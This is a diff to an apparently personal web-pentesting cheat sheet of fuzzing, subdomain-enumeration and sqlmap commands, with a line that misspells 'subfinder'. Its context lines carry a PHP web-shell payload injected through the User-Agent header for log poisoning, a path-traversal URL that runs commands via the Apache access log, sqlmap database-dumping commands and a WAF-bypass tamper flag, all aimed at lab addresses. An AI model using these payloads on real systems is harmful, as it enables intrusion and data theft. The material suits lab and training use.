@@ -8,6 +8,8 @@ feroxbuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/common.t
 ffuf -replay-proxy http://127.0.0.1:8080 #ffuf with proxy
 
 wfuzz -c -z file,numbers.txt -d "number=FUZZ" --hw 81 http://sustah.thm:8085/
+
+subdinder -d target.com -silent | dnsx -silent | gau
 ```
 ---
 #### Discover subdomains:
@@ -62,11 +64,6 @@ curl "http://10.10.62.183/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
 http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='command'
 ```
 ---
-#### bypass waf sqlmap
-```
---tamper=space2comment
-```
-
 ---
 #### cadaver for WebDAV
 ---
@@ -81,6 +78,8 @@ sqlmap -r req.txt -p <parametr> --dbs
 sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables
 sqlmap -r req.txt -D <database_name> -T <table_name> --columns
 sqlmap -r req.txt-p  -D <database_name> --dump-all
+
+--tamper=space2comment #bypass waf
 ```
 
 ---
